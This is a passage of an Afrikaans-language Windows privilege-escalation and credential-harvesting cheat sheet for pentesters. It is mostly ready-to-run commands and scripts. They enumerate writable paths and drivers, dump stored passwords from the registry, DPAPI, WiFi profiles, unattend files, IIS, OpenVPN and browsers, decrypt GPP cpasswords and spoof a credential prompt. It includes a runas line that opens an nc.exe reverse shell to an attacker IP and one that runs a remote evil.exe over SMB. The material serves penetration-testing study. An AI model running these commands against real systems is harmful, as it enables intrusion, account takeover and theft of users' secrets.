icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Hardloop by aanvang

**Kyk of jy enige register of binêre lêer kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autorun-plekke om voorregte te eskaleer**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Bestuurders

Soek na moontlike **derde party vreemde/ kwesbare** bestuurders
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PAD DLL Ontvoering

Indien jy **skryfregte binne 'n gids op die PAD** het, kan jy 'n DLL wat deur 'n proses gelaai word, ontvoer en sodoende **voorregte eskaleer**.

Kontroleer die regte van alle gidse binne die PAD:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Netwerk

### Aandele
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### gasheer-lêer

Kyk vir ander bekende rekenaars wat hardgekoppel is op die gasheer-lêer
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkinterfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kyk vir **beperkte dienste** van buite af
```bash
netstat -ano #Opened ports?
```
### Roetetabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Reëls

[**Kyk na hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer [opdragte vir netwerkopsomming hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsisteem vir Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy rootgebruiker kry, kan jy na enige poort luister (die eerste keer wat jy `nc.exe` gebruik om na 'n poort te luister, sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as 'n beheerder te begin, kan jy `--default-user root` probeer

Jy kan die `WSL`-lêersisteem verken in die vouer `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows-referenties

### Winlogon-referenties
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Geloofsbewaarder / Windows-kluis

Van [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows-kluis stoor gebruikersgelde vir bedieners, webwerwe en ander programme wat **Windows** kan **die gebruikers outomaties aanmeld**. Op die eerste oogopslag mag dit lyk asof gebruikers hul Facebook-gelde, Twitter-gelde, Gmail-gelde ens. kan stoor, sodat hulle outomaties kan aanmeld via webblaaie. Maar dit is nie so nie.

Windows-kluis stoor gelde wat Windows die gebruikers outomaties kan aanmeld, wat beteken dat enige **Windows-toepassing wat gelde benodig om toegang tot 'n hulpbron** (bediener of 'n webwerf) **te verkry, kan gebruik maak van hierdie Geldebestuurder** & Windows-kluis en die verskafte gelde kan gebruik in plaas daarvan dat gebruikers die gebruikersnaam en wagwoord die hele tyd invoer.

Tensy die toepassings met die Geldebestuurder interaksie het, dink ek nie dat dit moontlik is vir hulle om die gelde vir 'n gegewe hulpbron te gebruik nie. Dus, as jou toepassing die kluis wil gebruik, moet dit op een of ander manier **met die geldebestuurder kommunikeer en die gelde vir daardie hulpbron aanvra** vanuit die verstek bergkluis.

Gebruik die `cmdkey` om die gestoorde gelde op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` gebruik met die `/savecred`-opsies om die gestoorde geloofsbriewe te gebruik. Die volgende voorbeeld roep 'n afgeleë binêre lêer aan via 'n SMB-aandeel.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik `runas` met 'n voorsiene stel geloofsbriewe.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let wel dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), of van [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bied 'n metode vir simmetriese versleuteling van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die simmetriese versleuteling van asimmetriese privaatsleutels. Hierdie versleuteling maak gebruik van 'n gebruiker- of stelselgeheim om beduidende entropie by te dra.

**DPAPI maak die versleuteling van sleutels moontlik deur 'n simmetriese sleutel wat afgelei is van die gebruiker se aanmeldingsgeheime**. In scenario's wat stelselversleuteling behels, maak dit gebruik van die stelsel se domeinoutentiseringsgeheime.

Versleutelde gebruiker RSA-sleutels, deur DPAPI te gebruik, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}`-gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) verteenwoordig. **Die DPAPI-sleutel, saam met die meestersleutel wat die gebruiker se privaatsleutels beskerm in dieselfde lêer**, bestaan tipies uit 64 byte van ewekansige data. (Dit is belangrik om daarop te let dat toegang tot hierdie gids beperk is, wat voorkom dat die inhoud daarvan gelys word deur die `dir`-opdrag in CMD, alhoewel dit deur PowerShell gelys kan word).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te dekripteer.

Die **geloofsbriewe lêers wat deur die meester wagwoord beskerm word** is gewoonlik geleë in:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te dekripteer.\
Jy kan **baie DPAPI** **masterkeys** uit **geheue** onttrek met die `sekurlsa::dpapi` module (as jy root is).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Geldeenhede

**PowerShell geldeenhede** word dikwels gebruik vir **skripsie** en outomatiseringstake as 'n manier om versleutelde geldeenhede gerieflik te stoor. Die geldeenhede word beskerm deur **DPAPI**, wat tipies beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is, gedekripteer kan word.

Om 'n PS-geldeenheid van die lêer wat dit bevat te dekripteer, kan jy die volgende doen:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindings

Jy kan hulle vind op `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs Uitgevoerde Opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Afstandbeheer-geloofsbriewe-bestuurder**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg` module met die toepaslike `/masterkey` om enige .rdg lêers te **dekodeer**\
Jy kan **baie DPAPI meester sleutels** uit die geheue onttrek met die Mimikatz `sekurlsa::dpapi` module

### Plakkerige Notas

Mense gebruik dikwels die Plakkerige Notas-toep op Windows-werkstasies om **wagwoorde** en ander inligting te stoor, sonder om te besef dit is 'n databasis lêer. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om te soek en te ondersoek.

### AppCmd.exe

**Let daarop dat om wagwoorde van AppCmd.exe te herstel, moet jy 'n Administrateur wees en onder 'n Hoë Integriteitsvlak loop.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` gids.\
As hierdie lêer bestaan, is dit moontlik dat sommige **gelde** ingestel is en herstel kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kyk of `C:\Windows\CCM\SCClient.exe` bestaan.\
Installeerders word **met STELSELvoorregte uitgevoer**, baie is vatbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Registre (Legitieme Inligting)

### Putty-inligting
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Gasheer Sleutels
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-sleutels in register

SSH privaatsleutels kan binne die register sleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, so jy moet nagaan of daar iets interessants daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Indien jy enige inskrywing binne daardie pad vind, sal dit waarskynlik 'n gestoorde SSH-sleutel wees. Dit is versleutel maar kan maklik ontsluit word deur [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties begin by opstart, hardloop:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh-sleutels te skep, hulle by te voeg met `ssh-add` en in te teken via ssh na 'n masjien. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` geïdentifiseer tydens die asimmetriese sleutelverifikasie nie.
{% endhint %}

### Onaangemerkte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook vir hierdie lêers soek met **metasploit**: _post/windows/gather/enum\_unattend_

Voorbeeld inhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rugsteun
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolkmagwetbewys
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek na 'n lêer genaamd **SiteList.xml**

### Gekasheerde GPP-wagwoord

'n Funksie was vroeër beskikbaar wat die implementering van aangepaste plaaslike administrateur-rekeninge op 'n groep masjiene moontlik gemaak het deur middel van Groepbeleidsvoorkeure (GPP). Hierdie metode het egter aansienlike sekuriteitsfoute gehad. Eerstens kon die Groepbeleidsobjekte (GPO's), gestoor as XML-lêers in SYSVOL, deur enige domeingebruiker geopen word. Tweedens kon die wagwoorde binne hierdie GPP's, versleutel met AES256 met 'n publiek gedokumenteerde verstekleutel, deur enige geauthentiseerde gebruiker ontsluit word. Dit het 'n ernstige risiko ingehou, aangesien dit gebruikers kon toelaat om verhoogde voorregte te verkry.

Om hierdie risiko te verminder, is 'n funksie ontwikkel om plaaslik gekasheerde GPP-lêers te soek wat 'n "cpassword"-veld bevat wat nie leeg is nie. Nadat so 'n lêer gevind is, ontsluit die funksie die wagwoord en gee 'n aangepaste PowerShell-voorwerp terug. Hierdie voorwerp sluit besonderhede in oor die GPP en die lêer se ligging, wat help om hierdie sekuriteitskwesbaarheid te identifiseer en te herstel.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vorige aan W Vista)_ vir hierdie lêers:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Om die cPassword te ontsluit:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met geloofsbriewe:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN geloofsbriewe
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logboeke
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir geloofsbriewe

Jy kan altyd **die gebruiker vra om sy geloofsbriewe in te voer of selfs die geloofsbriewe van 'n ander gebruiker** as jy dink hy kan dit weet (let daarop dat **om** die klient direk vir die **geloofsbriewe** te **vra** werklik **riskant** is):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêernaam wat geloofsbriewe bevat**

Bekende lêers wat 'n tyd gelede **wagwoorde** in **teksvorm** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek deur al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geldeenhede in die Stortbak

Jy moet ook die Stortbak ondersoek vir geldeenhede daarin

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Binne die register

**Ander moontlike register sleutels met geldeenhede**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Onttrek openssh-sleutels uit die register.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiersgeskiedenis

Jy moet kyk vir databasisse waar wagwoorde van **Chrome of Firefox** gestoor word.\
Kyk ook na die geskiedenis, bladmerke en gunstelinge van die blaaiers sodat dalk sommige **wagwoorde daar gestoor is**.

Gereedskap om wagwoorde uit blaaiers te onttrek:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL-overskrywing**

**Component Object Model (COM)** is 'n tegnologie wat binne die Windows-bedryfstelsel gebou is en dit maak **onderlinge kommunikasie** moontlik tussen sagtewarekomponente van verskillende tale. Elke COM-komponent word geïdentifiseer deur 'n klass-ID (CLSID) en elke komponent stel funksionaliteit bloot via een of meer koppelvlakke, geïdentifiseer deur koppelvlak-ID's (IIDs).

COM-klasse en koppelvlakke word in die register onder **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** en **HKEY\_**_**CLASSES\_**_**ROOT\Interface** onderskeidelik gedefinieer. Hierdie register word geskep deur die **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** saam te voeg.

Binne die CLSIDs van hierdie register kan jy die kindregister **InProcServer32** vind wat 'n **verstekwaarde** bevat wat na 'n **DLL** verwys en 'n waarde genaamd **ThreadingModel** wat **Apartment** (Enkel-draad), **Free** (Multi-draad), **Both** (Enkel of Multi) of **Neutral** (Draadneutraal) kan wees.

![](<../../.gitbook/assets/image (729).png>)

Basies, as jy enige van die DLL's kan **overskryf wat uitgevoer gaan word**, kan jy **voorregte eskaleer** as daardie DLL deur 'n ander gebruiker uitgevoer gaan word.

Om te leer hoe aanvallers COM Hijacking as 'n volhoubaarheidsmeganisme gebruik, kyk na:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Generiese Wagwoordsoektog in lêers en register**

**Soek na lêerinhoud**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n spesifieke lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek in die register vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat soek na wagwoorde

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf**-inprop wat ek geskep het om hierdie inprop outomaties elke metasploit POST-module uit te voer wat soek na geloofsbriewe binne die slagoffer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties vir al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n puik gereedskap om wagwoorde uit 'n stelsel te onttrek.

Die gereedskap [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessies**, **gebruikersname** en **wagwoorde** van verskeie gereedskappe wat hierdie data in die teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Uitgelek Handlers

Stel jou voor dat **'n proses wat as SISTEEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **volle toegang**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met lae voorregte maar wat al die oop handlers van die hoofproses erf**.\
Dan, as jy **volle toegang tot die lae bevoorregte proses het**, kan jy die **oop handler na die bevoorregte proses wat geskep is** met `OpenProcess()` gryp en **'n shellcode inspuit**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en te misbruik**.](leaked-handle-exploitation.md)\
